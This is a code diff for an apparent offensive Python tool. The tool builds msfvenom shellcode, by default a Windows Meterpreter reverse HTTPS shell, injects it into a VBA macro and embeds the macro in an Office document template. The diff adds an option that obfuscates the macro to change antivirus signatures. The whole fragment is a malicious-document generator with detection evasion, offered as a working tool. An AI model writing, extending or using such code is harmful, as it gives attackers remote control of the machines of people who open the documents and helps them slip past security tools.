@@ -13,6 +13,7 @@ parser.add_argument("luri", help="uri to call", nargs='?', default="/")
 parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/meterpreter/reverse_https)", nargs='?', default="windows/meterpreter/reverse_https")
 parser.add_argument("--template", help="pad naar een .docx of .xlsx template om de macro in te injecteren")
 parser.add_argument("-o", "--output", help="output pad voor het macro-enabled document (standaard: .docm/.xlsm)")
+parser.add_argument("--obfuscate-vba", action="store_true", help="VBA macro obfuscatie toepassen")
 args = parser.parse_args()
 
 # Generate the shellcode given the preferred payload
@@ -38,6 +39,11 @@ payload = result.stdout
 
 #create the payload
 macro = template.replace('[payloadreplace]', payload.decode('utf-8'))
+
+if args.obfuscate_vba:
+    from obfuscate_av import obfuscate_vba
+    macro, vba_stats = obfuscate_vba(macro)
+    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] VBA obfuscatie: {vba_stats['string']} signatures aangepast{bcolors.ENDC}")
 
 if args.template:
     # Injecteer macro in Office document
